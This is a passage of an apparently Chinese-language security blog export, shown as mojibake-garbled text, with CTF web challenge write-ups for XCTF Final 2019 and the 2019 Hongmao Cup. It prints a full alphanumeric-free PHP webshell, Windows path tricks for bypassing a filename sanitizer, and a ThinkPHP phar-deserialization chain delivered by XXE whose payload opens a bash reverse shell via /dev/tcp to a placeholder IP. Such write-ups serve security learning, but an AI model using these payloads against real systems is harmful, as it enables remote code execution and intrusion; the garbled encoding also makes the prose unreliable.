class=\u0026#34;ghost\u0026#34;\u0026gt;i\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026#34;ghost\u0026#34;\u0026gt;l\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026#34;ghost\u0026#34;\u0026gt;e\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026#34;spaced\u0026#34;\u0026gt;I\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026#34;ghost\u0026#34;\u0026gt;n\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026#34;ghost\u0026#34;\u0026gt;c\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026#34;ghost\u0026#34;\u0026gt;l\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026#34;ghost\u0026#34;\u0026gt;u\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026#34;ghost\u0026#34;\u0026gt;s\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026#34;ghost\u0026#34;\u0026gt;i\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026#34;ghost\u0026#34;\u0026gt;o\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026#34;ghost\u0026#34;\u0026gt;n\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026#34;spaced\u0026#34;\u0026gt;2019\u0026lt;/li\u0026gt; \u0026lt;br\u0026gt; \u0026lt;br\u0026gt; \u0026lt;div class=\u0026#34;hide\u0026#34; id=\u0026#34;kawaii\u0026#34;\u0026gt; \u0026lt;center\u0026gt; \u0026lt;button class=\u0026#34;btn col-4 btn-success half\u0026#34; id=\u0026#34;get\u0026#34;\u0026gt;include\u0026lt;/button\u0026gt; \u0026lt;button class=\u0026#34;btn col-4 btn-warning\u0026#34; id=\u0026#34;put\u0026#34;\u0026gt;upload\u0026lt;/button\u0026gt; \u0026lt;button class=\u0026#34;btn col-3 btn-info\u0026#34; id=\u0026#34;info\u0026#34;\u0026gt;info\u0026lt;/button\u0026gt; \u0026lt;p class=\u0026#34;lightgrey\u0026#34;\u0026gt; Reference ID: \u0026lt;b class=\u0026#34;ref\u0026#34;\u0026gt;\u0026lt;?php echo $seed; ?\u0026gt;\u0026lt;/b\u0026gt; \u0026lt;/p\u0026gt; Made with \u0026amp;hearts; by stypr. \u0026lt;/center\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;script src=\u0026#34;https://code.jquery.com/jquery-3.3.1.min.js\u0026#34; nonce=\u0026#34;\u0026lt;?php echo $seed; ?\u0026gt;\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;//stackpath.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js\u0026#34; nonce=\u0026#34;\u0026lt;?php echo $seed; ?\u0026gt;\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;./static/legit.js\u0026#34; nonce=\u0026#34;\u0026lt;?php echo $seed; ?\u0026gt;\u0026#34; defer\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026lt;!-- https://www.youtube.com/watch?v=OEpeRmPkRIU --\u0026gt; ä¸è¿‡æ¯”è¾ƒæ— è¯­çš„æ˜¯æœ‰å¾ˆå¤šçš„åƒåœ¾ä»£ç \u0026hellip;å¯ä»¥çœ‹åˆ°æœ‰ä¸ªå‡ºé¢˜äººç•™çš„åé—¨å‡½æ•°ï¼Œbut å› ä¸ºcode_sanitizerçš„è¿‡æ»¤\n// The new kakkoii code-san is re-implemented. // function code_sanitizer($code){ // Computer-chan, please don\u0026#39;t speak english. Speak something else! //  $code = preg_replace(\u0026#34;/[^\u0026lt;\u0026gt;!@#$%\\^\u0026amp;*\\_?+\\.\\-\\\\\\\u0026#39;\\\u0026#34;\\=\\(\\)\\[\\]\\;]/u\u0026#34;, \u0026#34;*Nope*\u0026#34;, (string)$code); return $code; } è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ— å­—æ¯çš„ webshell æ¥è¿›è¡Œä¸€ä¸ªç»•è¿‡ï¼Œå¯ä»¥å‚è€ƒä¸€äº›ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshellï¼Œè¿™é‡Œæˆ‘å°±ç›´æ¥æ”¾ ROIS å¸ˆå‚…ä»¬çš„æ— å­—æ¯ webshell å†…å®¹äº†\n\u0026lt;?=$_=[]?\u0026gt;\u0026lt;?=$_=@\u0026#34;$_\u0026#34;?\u0026gt;\u0026lt;?=$___=$_[\u0026#39;!\u0026#39;!=\u0026#39;@\u0026#39;]?\u0026gt;\u0026lt;?=$____=$_[(\u0026#39;!\u0026#39;==\u0026#39;!\u0026#39;)+(\u0026#39;!\u0026#39;==\u0026#39;!\u0026#39;)+(\u0026#39;!\u0026#39;==\u0026#39;!\u0026#39;)]?\u0026gt;\u0026lt;?=$_=$____?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$__.=$_?\u0026gt;\u0026lt;?=$_=$____?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$__.=$_?\u0026gt;\u0026lt;?=$_=$____?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$__.=$_?\u0026gt;\u0026lt;?=$_=$____?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$__.=$_?\u0026gt;\u0026lt;?=$_=\u0026#34;_\u0026#34;?\u0026gt;\u0026lt;?=$__.=$_?\u0026gt;\u0026lt;?=$_=$____?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$__.=$_?\u0026gt;\u0026lt;?=$_=$____?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$__.=$_?\u0026gt;\u0026lt;?=$_=$____?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$__.=$_?\u0026gt;\u0026lt;?=$_=\u0026#34;_\u0026#34;?\u0026gt;\u0026lt;?=$__.=$_?\u0026gt;\u0026lt;?=$_=$____?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$__.=$_?\u0026gt;\u0026lt;?=$_=$____?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$__.=$_?\u0026gt;\u0026lt;?=$_=$____?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$__.=$_?\u0026gt;\u0026lt;?=$_=$____?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$__.=$_?\u0026gt;\u0026lt;?=$_=$____?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$__.=$_?\u0026gt;\u0026lt;?=$_=$____?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$__.=$_?\u0026gt;\u0026lt;?=$_=$____?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$__.=$_?\u0026gt;\u0026lt;?=$_=$____?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$__.=$_?\u0026gt;\u0026lt;?=$_____=$__?\u0026gt;\u0026lt;?=$__=\u0026#39;\u0026#39;?\u0026gt;\u0026lt;?=$_=$____?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$__.=$_?\u0026gt;\u0026lt;?=$_=$____?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$__.=$_?\u0026gt;\u0026lt;?=$_=$____?\u0026gt;\u0026lt;?=$__.=$_?\u0026gt;\u0026lt;?=$_=$____?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$__.=$_?\u0026gt;\u0026lt;?=$_=\u0026#34;.\u0026#34;?\u0026gt;\u0026lt;?=$__.=$_?\u0026gt;\u0026lt;?=$_=$____?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$__.=$_?\u0026gt;\u0026lt;?=$_=$____?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$__.=$_?\u0026gt;\u0026lt;?=$_=$____?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$_++?\u0026gt;\u0026lt;?=$__.=$_?\u0026gt;\u0026lt;?=$_____($__)?\u0026gt; ä¸è¿‡ä»–ä»¬å¯èƒ½æé”™äº†ï¼Œè¿™é‡Œä»–ä»¬æœ¬æ„æƒ³ç”¨\u0026lt;?=?\u0026gt;æ¥ç»•è¿‡;é™åˆ¶ï¼Œä½†æ˜¯å…¶å®;å¹¶æ²¡æœ‰è¿‡æ»¤\u0026hellip;\næœ€åä¸€æ­¥å¯ä»¥è¯´æœ‰äº†ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹å‰å‡ æ­¥ï¼ŒPutç±»çš„__constructæœ‰ä¸€ä¸ªpath_sanitizerï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸€äº›æ£€æŸ¥ä»€ä¹ˆçš„ï¼Œæ²¡æœ‰falseçš„æƒ…å†µæ˜¯ä¸ä¼šè¿‡æ»¤/çš„ï¼Œè¿™é‡Œåˆå§‹åŒ–çš„æ—¶å€™ä¸ä¼šè¿‡æ»¤/ã€‚\næ‰€ä»¥å¦‚æœæˆ‘ä»¬åœ¨å†™æ–‡ä»¶çš„æ—¶å€™ï¼Œç”¨put\u0026amp;test/testå»å†™testç›®å½•testæ–‡ä»¶ï¼Œfile_put_contentsä¼šå› ä¸ºtestç›®å½•ä¸å­˜åœ¨è€Œå†™ä¸è¿›å»ã€‚\nfile_put_contents(./test/test): failed to open stream: No such file or directory é‚£å¦‚æœæˆ‘ä»¬ç›´æ¥å†™è¿›ä¸€ä¸ªtestæ–‡ä»¶å‘¢ï¼Ÿå†™æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œä½†æ˜¯æˆ‘ä»¬åœ¨ç”¨getè·¯ç”±è¯»çš„æ—¶å€™å°±ä¼šå‘ç”Ÿé—®é¢˜äº†ã€‚\nfunction get(){ if($this-\u0026gt;filename === false){ return [\u0026#34;msg\u0026#34; =\u0026gt; \u0026#34;blocked by path sanitizer\u0026#34;, \u0026#34;type\u0026#34; =\u0026gt; \u0026#34;error\u0026#34;]; } // wtf???? //  if(!@file_exists($this-\u0026gt;filename)){ // index files are *completely* disabled. //  if(stripos($this-\u0026gt;filename, \u0026#34;index\u0026#34;) !== false){ return [\u0026#34;msg\u0026#34; =\u0026gt; \u0026#34;you cannot include index files!\u0026#34;, \u0026#34;type\u0026#34; =\u0026gt; \u0026#34;error\u0026#34;]; } // hardened sanitizer spawned. thus we sense ambiguity //  $read_file = \u0026#34;./files/\u0026#34; . $this-\u0026gt;filename; $read_file_with_hardened_filter = \u0026#34;./files/\u0026#34; . path_sanitizer($this-\u0026gt;filename, true); if($read_file === $read_file_with_hardened_filter || @file_get_contents($read_file) === @file_get_contents($read_file_with_hardened_filter)){ return [\u0026#34;msg\u0026#34; =\u0026gt; \u0026#34;request blocked\u0026#34;, \u0026#34;type\u0026#34; =\u0026gt; \u0026#34;error\u0026#34;]; } // .. and finally, include *un*exploitable file is included. //  @include(\u0026#34;./files/\u0026#34; . $this-\u0026gt;filename); return [\u0026#34;type\u0026#34; =\u0026gt; \u0026#34;success\u0026#34;]; }else{ return [\u0026#34;msg\u0026#34; =\u0026gt; \u0026#34;invalid filename (wtf)\u0026#34;, \u0026#34;type\u0026#34; =\u0026gt; \u0026#34;error\u0026#34;]; } } æˆ‘ä»¬ä»”ç»†çœ‹è¿™æ®µä»£ç ï¼Œç”±äºpath_sanitizerä¼ å…¥äº†trueï¼Œè¿™é‡Œä¼šæŠŠä¼ å…¥çš„æ–‡ä»¶åå½“ä¸­/è¿‡æ»¤ä¸ºç©ºï¼Œç„¶åæœ‰ä¸€ä¸ªæ¯”è¾ƒï¼Œå¦‚æœç›´æ¥æ‹¼æ¥å¾—åˆ°çš„è·¯å¾„ä¸æ‹¼æ¥ä¸Šè¿‡æ»¤ä¹‹åå¾—åˆ°çš„è·¯å¾„ç›¸ç­‰çš„è¯ï¼Œä¼šè¿›ä¸€æ­¥æ¯”è¾ƒä»–ä»¬çš„æ–‡ä»¶å†…å®¹ï¼Œå¦‚æœç›¸ç­‰çš„è¯å°±ä¼šè¢« block \u0026hellip;è€Œæˆ‘ä»¬è¦è¿›è¡Œ include ï¼Œé‚£å°±éœ€è¦ç»•è¿‡è¿™ä¸¤ä¸ªåˆ¤æ–­\u0026hellip;\nä»€ä¹ˆä¸ªæ„æ€å‘¢ï¼Ÿå°±æ˜¯å³ä½¿æ–‡ä»¶åç›¸ç­‰ï¼Œå†…å®¹ä¹Ÿä¸èƒ½ç›¸ç­‰ã€‚\nä½†æ˜¯æˆ‘ä»¬è¿™é‡Œè¦æ³¨æ„path_sanitizerï¼Œå¦‚æœæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªå«æœ‰/çš„æ–‡ä»¶åé‚£å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ–¹æ³•ç»•è¿‡æ–‡ä»¶åçš„åˆ¤æ–­ï¼Œç›´æ¥è¿›è¡ŒåŒ…å«äº†ã€‚\nè€Œé¢˜ç›®ç¯å¢ƒæˆ‘ä»¬å¯ä»¥ç”±ä¸€å¼€å§‹çš„ phpinfo å¾—åˆ°æ˜¯ä¸€ä¸ª windows çš„ç¯å¢ƒï¼ˆè™½ç„¶èµ›åœºæ˜¯æ²¡æœ‰çš„ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥é€šè¿‡å„ç§æ–¹æ³•åˆ¤æ–­ä¸€ä¸‹ï¼Œæ¯”å¦‚ nmap å•¥çš„\u0026hellip;ï¼‰\næ‰€ä»¥æˆ‘ä»¬ç°åœ¨ä¸»è¦å°±æ˜¯ç»•è¯»å†™æ–‡ä»¶è¿™ä¸€å—äº†ã€‚\nTrick 1  â€‹\tå¯¹äºWindowsçš„æ–‡ä»¶è¯»å–ï¼Œæœ‰ä¸€ä¸ªå° Trick ï¼šä½¿ç”¨FindFirstFileè¿™ä¸ªAPIçš„æ—¶å€™ï¼Œå…¶ä¼šæŠŠ\u0026quot;è§£é‡Šä¸º.ã€‚\nshell\u0026quot;php === shell.php\t//true  æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ª trick ï¼Œæ¥æ„é€ æ–‡ä»¶åä¸º\u0026quot;/testçš„æ–‡ä»¶ï¼Œä»€ä¹ˆä¸ªæ„æ€å‘¢ï¼Ÿ\n$read_file = \u0026#34;./files/./test\u0026#34;; $read_file_with_hardened_filter = \u0026#34;./files/.test\u0026#34;; file_get_contents($read_file) = \u0026#39;å®é™…æ–‡ä»¶å†…å®¹\u0026#39;; file_get_contents($read_file_with_hardened_filter) = false //æ–‡ä»¶ä¸å­˜åœ¨ ä¼ å…¥çš„\u0026quot;/testæ–‡ä»¶åï¼Œç”±äºè¿™ä¸ª trick ï¼Œä¼šè¢« Windows è®¤ä¸ºæ˜¯./testï¼Œæ‰€ä»¥åœ¨å¤„ç†è¿™ä¸ªæ–¹å¼ä¸Šå°±äº§ç”Ÿäº†å·®å¼‚ä¹Ÿå°±ç»•è¿‡äº†ä¸¤ä¸ªåˆ¤æ–­\nTrick 2 å¯ä»¥å‚è€ƒ windowsçš„ä¸€äº›ç‰¹æ€§ è¿™ç¯‡æ–‡ç« ï¼Œæ–‡ç« æœ€åå‘Šè¯‰æˆ‘ä»¬ï¼Œå¯ä»¥ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶åä¸ºtest::$INDEX_ALLOCATIONçš„æ–‡ä»¶ï¼Œå°±ç›¸å½“äºåˆ›å»ºäº†ä¸€ä¸ªtestçš„æ–‡ä»¶å¤¹ï¼Œè¯¦ç»†åŸç†å¯ä»¥çœ‹è¯¥ç¯‡æ–‡ç« ã€‚\nè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å…ˆç”¨è¿™ä¸ª Trick åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹testï¼Œç„¶åç”¨putéšæ„å†™ä¸€ä¸ªæ–‡ä»¶test/fileï¼Œåœ¨è¯»å–çš„æ—¶å€™ï¼Œç”±äºpath_sanitizerä¼šæŠŠæˆ‘ä»¬çš„/è¿‡æ»¤ï¼Œå°±æˆåŠŸç»•è¿‡äº†æ–‡ä»¶åçš„åˆ¤æ–­äº†ã€‚ç»•è¿‡äº†è¿™äº›å°±åªå‰©ä¸‹æ— å­—æ¯å†™ webshell çš„é—®é¢˜äº†ã€‚\nnoxss å•ç‹¬ä¸ºè¿™é“é¢˜å¼€ä¸€ç¯‡æ–‡ç« æ¥å†™ï¼ŒçœŸçš„tql\u0026hellip;\ntfboys æœºå™¨å­¦ä¹ çš„é¢˜ç›®ï¼Œè¡¨ç¤ºä¸ä¼š\u0026hellip;åœ°å€åœ¨ XCTF-2019-tfboys\nConclusion ä½“éªŒæå…¶å¥½çš„ä¸€æ¬¡æ¯”èµ›ï¼Œéå¸¸æ„Ÿè°¢ @r3kapig å¸ˆå‚…ä»¬çš„ç²¾å¿ƒå‡†å¤‡ï¼Œæ¯«ä¸å¤¸å¼ åœ°è¯´ï¼Œè¿™æ˜¯æœ¬å¹´åº¦ä½“éªŒæœ€å¥½çš„ä¸€åœºæ¯”èµ›ï¼Œæ— è®ºä»é¢˜ç›®è´¨é‡æˆ–è€…æ˜¯ä»æ¯”èµ›è¿‡ç¨‹çš„ä½“éªŒï¼Œéƒ½æ˜¯éå¸¸æ£’çš„ã€‚å¸Œæœ›å›½å†…ä»¥åæ›´å¤šä¸€äº›è¿™ç±»çš„è‰¯å¿ƒæ¯”èµ›ï¼\n \n","date":"2019-11-14T00:02:53Z","permalink":"https://blog.zeddyu.info/2019/11/14/XCTF-Final-2019/","title":"XCTF Final 2019 Web Write Up"},{"content":"çº¢å¸½æ¯ 2019 Web Write Up (é™¤ iCloudMusic\n[TOC]\nTicket_System XXE 2 Phar ååºåˆ—åŒ–åŠ  Nu1lCTF sql_manager çš„ thinkphp pop é“¾å°±è¡Œäº†\n\u0026lt;?php namespace think\\process\\pipes { class Windows { private $files; public function __construct($files) { $this-\u0026gt;files = array($files); } } } namespace think\\model\\concern { trait Conversion { protected $append = array(\u0026#34;Zedd\u0026#34; =\u0026gt; \u0026#34;1\u0026#34;); } trait Attribute { private $data; private $withAttr = array(\u0026#34;Zedd\u0026#34; =\u0026gt; \u0026#34;system\u0026#34;); public function get($system) { $this-\u0026gt;data = array(\u0026#34;Zedd\u0026#34; =\u0026gt; \u0026#34;$system\u0026#34;); } } } namespace think { abstract class Model { use model\\concern\\Attribute; use model\\concern\\Conversion; } } namespace think\\model{ use think\\Model; class Pivot extends Model { public function __construct($system) { $this-\u0026gt;get($system); } } } namespace { $Conver = new think\\model\\Pivot(\u0026#34;bash -c \u0026#39;sh \u0026gt;\u0026amp; /dev/tcp/you r_ip/port 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;); $payload = new think\\process\\pipes\\Windows($Conver); ini_set(\u0026#39;phar.readonly\u0026#39;,0); @unlink(\u0026#34;phar.phar\u0026#34;); $phar = new Phar(\u0026#34;phar.phar\u0026#34;); //åç¼€åå¿…é¡»ä¸ºphar  $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#34;GIF89a\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026#34;); //è®¾ç½®stub  $phar-\u0026gt;setMetadata($payload); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest  $phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;test\u0026#34;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶  //ç­¾åè‡ªåŠ¨è®¡ç®—  $phar-\u0026gt;stopBuffering(); rename(\u0026#39;phar.phar\u0026#39;,\u0026#39;phar.xml\u0026#39;); } ?\u0026gt;ä¼ è¿™ä¸ª xml ä¸Šå»ä¹‹åå†å‘ä»¥ä¸‹è¯·æ±‚ï¼š\nPOST /postxml HTTP/1.1 Host: zedd.vv:8000 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: PHPSESSID=e4gevanqetq7dvri2q8ujh68hr Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Content-Type: application/xml;charset=utf-8 Content-Length: 229 \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt;\u0026lt;!DOCTYPE root [\u0026lt;!ENTITY test SYSTEM \u0026#39;phar:///tmp/uploads/28b20c7474c6127c57486e26ad1442b9/20191110/e08b7a076a3d519f8936d3d8b8c17a27.xml\u0026#39;\u0026gt;]\u0026gt; \u0026lt;user\u0026gt;\u0026lt;username\u0026gt;\u0026amp;test;\u0026lt;/username\u0026gt;\u0026lt;password\u0026gt;admin\u0026lt;/password\u0026gt;\u0026lt;/user\u0026gt; ç”¨ XXE è§¦å‘ phar ååºåˆ—åŒ–å³å¯ã€‚\næˆ‘çœ‹æœ‰äº›å¸ˆå‚…è¿˜åœ¨ä¸º/readflagå¤´ç–¼\u0026hellip;è¿™ä¹Ÿä¸æ˜¯å•¥æ–°ç©æ„äº†ï¼Œå¯ä»¥ç›´æ¥ç”¨trap \u0026quot;\u0026quot; 14å°±å¯ä»¥è®©éªŒè¯ç åœä¸‹æ¥äº†ã€‚\nbank_service Second Blood\nåšçš„è¿˜æ˜¯æ¯”è¾ƒæœ‰æ„æ€çš„ä¸€é¢˜ï¼Œå¯æƒœå½“æ—¶åšçš„æ¯”è¾ƒzzï¼Œæœ¬æ¥å¯ä»¥ä¸€è¡€ï¼Œå°±æ˜¯å› ä¸ºè‡ªå·±å¼„çš„å¤ªä¸å°å¿ƒäº†ã€‚\nå› 